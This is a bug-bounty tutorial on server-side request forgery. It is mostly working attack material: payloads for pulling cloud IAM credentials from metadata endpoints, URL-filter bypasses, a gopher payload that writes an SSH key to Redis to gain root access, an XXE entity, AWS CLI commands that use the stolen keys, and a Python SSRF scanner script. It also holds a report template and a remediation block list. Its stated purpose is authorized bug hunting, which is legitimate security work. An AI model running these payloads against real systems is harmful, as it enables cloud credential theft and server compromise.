# 🎯 SSRF Deep Dive: Server-Side Request Forgery

**High-impact vulnerability that can lead to cloud credential theft, internal network access, and RCE. One of the most valuable bugs in 2025.**

---

## What is SSRF?

**Server-Side Request Forgery (SSRF)** occurs when an attacker can make the server send HTTP requests to arbitrary destinations. This allows accessing internal services, cloud metadata, and bypassing network restrictions.

### Simple Analogy

Imagine you ask a company employee to fetch a document for you:
- **Normal**: They fetch the document you asked for
- **SSRF**: You trick them into fetching documents from the CEO's office (internal) or stealing the company safe combination (metadata)

### Real-World Example

```http
# Normal usage - fetch external image
POST /api/import-image HTTP/1.1
{
  "url": "https://cdn.example.com/image.jpg"
}

# SSRF - access internal admin panel
POST /api/import-image HTTP/1.1
{
  "url": "http://localhost/admin"
}

# SSRF - steal AWS credentials
POST /api/import-image HTTP/1.1
{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

---

## Why SSRF is Valuable

1. **High Bounties** - $2,000 to $20,000+
2. **Critical Impact** - Access to internal systems
3. **Cloud Era** - AWS/Azure/GCP metadata is gold
4. **Less Common** - Fewer hunters test for it
5. **Chainable** - Often leads to RCE or data breach

---

## Where to Find SSRF

### Common Vulnerable Features

```
1. Image/File Import
   - "Import from URL"
   - "Upload from URL"
   - "Fetch image"

2. PDF Generators
   - Convert URL to PDF
   - Generate invoice from URL
   - Save webpage as PDF

3. Webhooks
   - Webhook URLs
   - Callback URLs
   - Notification endpoints

4. Link Preview/Metadata Fetch
   - URL unfurling (Slack-style)
   - Open Graph preview
   - Link expansion

5. Integrations
   - Import from Google Drive
   - Fetch from Dropbox
   - Third-party API calls

6. Document Processing
   - XML parsers (XXE → SSRF)
   - SVG file uploads
   - Office documents

7. Analytics/Monitoring
   - Check URL status
   - Monitor external services
   - Ping endpoints
```

### Parameters to Test

```
url=
uri=
path=
dest=
destination=
redirect=
callback=
webhook=
feed=
host=
port=
next=
data=
reference=
site=
html=
```

---

## SSRF Testing Methodology

### Phase 1: Discovery

**Look for any feature that:**
1. Accepts a URL as input
2. Fetches external resources
3. Makes outbound HTTP requests
4. Processes remote content

**Quick Test:**
```http
# Try requesting your own server
POST /api/import HTTP/1.1
{
  "url": "http://your-server.com/test"
}

# Check your server logs
# If you see a request → Potential SSRF
```

### Phase 2: Basic SSRF Test

```http
# Test internal IP access
url=http://127.0.0.1
url=http://localhost
url=http://0.0.0.0
url=http://[::1]
url=http://0177.0.0.1 (octal)
url=http://2130706433 (decimal IP)

# Test internal network
url=http://192.168.1.1
url=http://10.0.0.1
url=http://172.16.0.1

# Test common internal services
url=http://localhost:80 (HTTP)
url=http://localhost:443 (HTTPS)
url=http://localhost:22 (SSH)
url=http://localhost:3306 (MySQL)
url=http://localhost:5432 (PostgreSQL)
url=http://localhost:6379 (Redis)
url=http://localhost:9200 (Elasticsearch)
```

### Phase 3: Cloud Metadata (AWS)

**The golden target for SSRF in 2025:**

```http
# AWS Metadata endpoint
url=http://169.254.169.254/latest/meta-data/

# Get IAM credentials
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Enumerate roles
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]

# Response contains:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "..."
}
```

**Other Cloud Providers:**

```bash
# Google Cloud
url=http://metadata.google.internal/computeMetadata/v1/
url=http://metadata/computeMetadata/v1/
Header: Metadata-Flavor: Google

# Azure
url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header: Metadata: true

# DigitalOcean
url=http://169.254.169.254/metadata/v1/

# Oracle Cloud
url=http://192.0.0.192/latest/
```

### Phase 4: Internal Service Discovery

```http
# Common internal services
url=http://localhost/admin
url=http://localhost/server-status
url=http://localhost:8080
url=http://internal-api.local
url=http://admin.internal

# Docker API
url=http://localhost:2375/containers/json

# Kubernetes
url=http://localhost:10250/pods
```

---

## SSRF Bypass Techniques

### Bypass 1: Blacklist Evasion

If `localhost` is blocked:

```http
# Alternative representations of localhost
127.0.0.1
127.1
127.0.1
0.0.0.0
0
localhost.
[::1]
[::ffff:127.0.0.1]

# Octal/Decimal/Hex encoding
0177.0.0.1 (octal)
2130706433 (decimal)
0x7f.0x0.0x0.0x1 (hex)

# DNS rebinding
burpcollaborator.net → points to 127.0.0.1
```

### Bypass 2: URL Schema Tricks

```http
# Try different protocols
http://internal
https://internal
file:///etc/passwd
ftp://internal
gopher://internal
dict://internal:6379/info
sftp://internal

# Wrapper protocols (PHP)
php://filter/resource=http://internal
expect://id
data://text/plain,<?php system($_GET['cmd']); ?>
```

### Bypass 3: DNS Tricks

```http
# Subdomain pointing to internal IP
url=http://127.0.0.1.example.com
# (where *.example.com → 127.0.0.1)

# DNS rebinding
# First request: resolves to attacker IP (passes validation)
# Second request: resolves to 127.0.0.1 (SSRF!)

# Use services like:
# - 1u.ms
# - nip.io
# - sslip.io

url=http://127.0.0.1.nip.io
# → Resolves to 127.0.0.1
```

### Bypass 4: URL Parsing Confusion

```http
# Using @ symbol
url=http://expected.com@127.0.0.1
# Browser/app might see: expected.com
# Server connects to: 127.0.0.1

# Using # fragment
url=http://127.0.0.1#expected.com

# Using ? query
url=http://127.0.0.1?expected.com

# Using \ instead of /
url=http://expected.com\@127.0.0.1

# Using rare characters
url=http://expected.com%2500@127.0.0.1
```

### Bypass 5: Open Redirect Chaining

```http
# If target has open redirect, use it!
url=https://trusted.com/redirect?url=http://169.254.169.254/

# Chain through their own redirector
# trusted.com redirects → internal IP
```

### Bypass 6: Protocol Smuggling

```http
# Gopher protocol can send raw TCP
gopher://localhost:6379/_KEYS *
# Sends: KEYS * to Redis on port 6379

# Dict protocol
dict://localhost:11211/stats
# Stats from Memcached
```

---

## Blind SSRF

When you can't see the response but the request is made.

### Detection Methods

**1. Time-Based**
```http
# Request to internal service (fast)
url=http://192.168.1.1
Response time: 0.1s

# Request to non-existent IP (slow - timeout)
url=http://192.168.1.254
Response time: 30s

# Different timing → Blind SSRF exists
```

**2. Out-of-Band (OOB)**
```http
# Use Burp Collaborator or similar
url=http://your-unique-id.burpcollaborator.net

# Check for DNS lookup or HTTP request
# If you see it → SSRF confirmed
```

**3. Boolean-Based**
```http
# Valid internal service
url=http://localhost:80 → Success message

# Invalid port
url=http://localhost:99999 → Error message

# Different responses → Blind SSRF
```

---

## SSRF Exploitation

### Exploit 1: AWS Credentials Theft

```bash
# 1. Enumerate IAM roles
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Response: role-name-here

# 2. Get credentials for role
http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name-here

# Response:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalrXUtn...",
  "Token": "IQoJb3JpZ..."
}

# 3. Use AWS CLI
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="wJalrXUtn..."
export AWS_SESSION_TOKEN="IQoJb3JpZ..."

aws s3 ls
aws ec2 describe-instances
aws iam list-users
```

### Exploit 2: Internal Port Scanning

```python
# Port scan internal network
for port in range(1, 1000):
    url = f"http://192.168.1.1:{port}"
    # Send SSRF request
    # Check response time or error message
    # Map internal network
```

### Exploit 3: Redis Exploitation (via Gopher)

```http
# Write SSH key to authorized_keys
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a*3%0d%0a$3%0d%0aSET%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0assh-rsa AAAA...%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a

# This writes your SSH key to /root/.ssh/authorized_keys
# You can now SSH as root!
```

### Exploit 4: XXE to SSRF

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

---

## Real-World SSRF Examples

### Example 1: Capital One Breach (2019)
**Impact: 100 million customer records**

```
Vulnerability: SSRF in WAF
Exploit: Access AWS metadata
Result: Stole IAM credentials → S3 bucket access
Damage: $80 million fine
```

### Example 2: Shopify SSRF
**Bounty: $25,000**

```
Vulnerability: Import product from URL
Exploit: http://169.254.169.254/...
Impact: Access to internal services and metadata
```

### Example 3: GitLab SSRF
**Bounty: $12,000**

```
Vulnerability: Webhook feature
Exploit: Access internal Redis
Impact: RCE via Redis exploitation
```

### Example 4: PayPal SSRF
**Bounty: $15,300**

```
Vulnerability: SVG file upload
Exploit: XXE → SSRF → internal network
Impact: Internal service enumeration
```

---

## SSRF Impact Assessment

### Low Impact ($500-$1,500)
- Port scanning internal network
- Basic service enumeration
- Non-sensitive internal pages

### Medium Impact ($2,000-$5,000)
- Access to internal admin panels
- Information disclosure
- Internal API access

### High Impact ($5,000-$15,000)
- Cloud metadata access
- Database access
- Sensitive internal services

### Critical Impact ($15,000-$50,000+)
- AWS/GCP/Azure credential theft
- Full RCE
- Complete internal network compromise
- Data breach of customer data

---

## Writing an SSRF Report

### Title
```
SSRF in image import functionality allows AWS metadata access
```

### Summary
```
A Server-Side Request Forgery (SSRF) vulnerability exists in the
/api/import-image endpoint. An attacker can make the server send
HTTP requests to arbitrary destinations, including AWS metadata
endpoint, allowing theft of IAM credentials.
```

### Steps to Reproduce

```markdown
1. Navigate to https://target.com/import
2. Click "Import from URL"
3. Enter the following URL:
   `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
4. Submit the form
5. Observe the response contains IAM role names
6. Request credentials for the role:
   `http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]`
7. Observe AWS credentials in response

**Expected**: Request should be blocked or validated
**Actual**: Server makes request and returns sensitive metadata
```

### Proof of Concept

```http
POST /api/import-image HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}

Response:
{
  "content": "prod-ec2-role"
}

POST /api/import-image HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-ec2-role"
}

Response:
{
  "content": {
    "AccessKeyId": "ASIA...",
    "SecretAccessKey": "wJalr...",
    "Token": "IQoJb..."
  }
}
```

### Impact

```markdown
An attacker can:
1. Steal AWS IAM credentials
2. Access S3 buckets with customer data
3. Launch/terminate EC2 instances
4. Modify security groups
5. Potentially achieve full AWS account compromise

Business Impact:
- Complete cloud infrastructure compromise
- Data breach of all customer data
- Regulatory violations (GDPR, PCI-DSS)
- Estimated damage: $10M+
```

### Remediation

```markdown
1. Whitelist allowed domains/IPs
2. Block access to metadata endpoints
3. Validate and sanitize URLs
4. Use IMDSv2 (requires token)
5. Implement network segmentation

Example fix:
```python
BLOCKED_HOSTS = [
    '127.0.0.1', 'localhost', '169.254.169.254',
    '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16'
]

def is_safe_url(url):
    parsed = urlparse(url)
    ip = socket.gethostbyname(parsed.hostname)

    for blocked in BLOCKED_HOSTS:
        if ip_in_range(ip, blocked):
            raise SecurityError("Blocked IP range")

    return True
```
```

---

## SSRF Testing Checklist

### Discovery
- [ ] Find features that accept URLs
- [ ] Find image upload/import functions
- [ ] Find PDF generators
- [ ] Find webhook configurations
- [ ] Find integration endpoints
- [ ] Find link preview features

### Basic Testing
- [ ] Test with `http://127.0.0.1`
- [ ] Test with `http://localhost`
- [ ] Test internal IP ranges
- [ ] Test common internal ports
- [ ] Test cloud metadata endpoints

### Bypass Testing
- [ ] Alternative localhost representations
- [ ] URL encoding tricks
- [ ] DNS rebinding
- [ ] Protocol smuggling
- [ ] Open redirect chaining
- [ ] URL parsing confusion

### Exploitation
- [ ] Access AWS/GCP/Azure metadata
- [ ] Internal port scanning
- [ ] Access internal admin panels
- [ ] Redis/Memcached exploitation
- [ ] Docker API access

### Documentation
- [ ] Clear reproduction steps
- [ ] PoC requests/responses
- [ ] Impact analysis
- [ ] AWS credentials (if found)
- [ ] Remediation suggestions

---

## SSRF Scanner Script

```python
#!/usr/bin/env python3
# SSRF Scanner

import requests
import sys

PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://0.0.0.0",
    "http://[::1]",
    "http://192.168.1.1",
    "http://10.0.0.1",
]

def test_ssrf(url, param, cookies=None):
    print(f"[*] Testing SSRF on {url}")
    print(f"[*] Parameter: {param}\n")

    for payload in PAYLOADS:
        data = {param: payload}

        try:
            resp = requests.post(url, json=data, cookies=cookies, timeout=10)

            print(f"[>] Payload: {payload}")
            print(f"    Status: {resp.status_code}")
            print(f"    Length: {len(resp.text)} bytes")

            # Check for SSRF indicators
            if "169.254" in resp.text:
                print("    [!] AWS METADATA FOUND!")
            if "AccessKeyId" in resp.text:
                print("    [!!!] AWS CREDENTIALS LEAKED!")
            if "Google" in resp.text and "metadata" in resp.text:
                print("    [!] GCP METADATA FOUND!")

            print()

        except requests.exceptions.Timeout:
            print(f"[>] Payload: {payload} - TIMEOUT")
        except Exception as e:
            print(f"[>] Payload: {payload} - ERROR: {e}")

if __name__ == "__main__":
    test_ssrf(
        url="https://target.com/api/import",
        param="url",
        cookies={"session": "your_token"}
    )
```

---

## Practice Resources

1. **PortSwigger SSRF Labs**
   - https://portswigger.net/web-security/ssrf

2. **HackTheBox Machines**
   - Bart, Haircut, etc.

3. **SSRF Bible**
   - https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery

---

**SSRF is one of the most lucrative vulnerabilities in 2025. Master it for consistent high payouts.**

**Happy hunting! 🎯**
